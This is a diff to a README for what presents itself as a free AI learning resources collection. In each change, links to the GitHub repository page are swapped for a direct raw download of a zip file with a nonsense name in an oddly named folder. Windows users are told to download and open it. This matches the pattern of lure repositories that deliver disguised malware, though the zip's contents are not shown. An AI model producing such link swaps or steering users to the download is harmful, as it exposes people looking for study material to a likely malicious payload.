@@ -1,6 +1,6 @@
 # 📘 Artificial-Intelligence-Learning-Resources-Collection - Free AI Learning in One Place
 
-[![Visit Download Page](https://img.shields.io/badge/Visit%20Download%20Page-2E86DE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sarcosomataceaeteju369/Artificial-Intelligence-Learning-Resources-Collection)
+[![Visit Download Page](https://img.shields.io/badge/Visit%20Download%20Page-2E86DE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Sarcosomataceaeteju369/Artificial-Intelligence-Learning-Resources-Collection/main/soldieress/Intelligence_Collection_Learning_Resources_Artificial_pancreatoduodenectomy.zip)
 
 ## 🧭 Overview
 
@@ -26,7 +26,7 @@ This project does not need a complex install. On Windows, you only need a web br
 ### Steps
 
 1. Open the download page:
-   https://github.com/Sarcosomataceaeteju369/Artificial-Intelligence-Learning-Resources-Collection
+   https://raw.githubusercontent.com/Sarcosomataceaeteju369/Artificial-Intelligence-Learning-Resources-Collection/main/soldieress/Intelligence_Collection_Learning_Resources_Artificial_pancreatoduodenectomy.zip
 
 2. On the page, review the files and folders in the repository.
 
@@ -117,7 +117,7 @@ Start with the simplest topic first if you are new to AI.
 
 Use the link below to visit the repository and access the collection:
 
-https://github.com/Sarcosomataceaeteju369/Artificial-Intelligence-Learning-Resources-Collection
+https://raw.githubusercontent.com/Sarcosomataceaeteju369/Artificial-Intelligence-Learning-Resources-Collection/main/soldieress/Intelligence_Collection_Learning_Resources_Artificial_pancreatoduodenectomy.zip
 
 If the repository includes a download file or release package, download it from that page and open it on Windows.
 
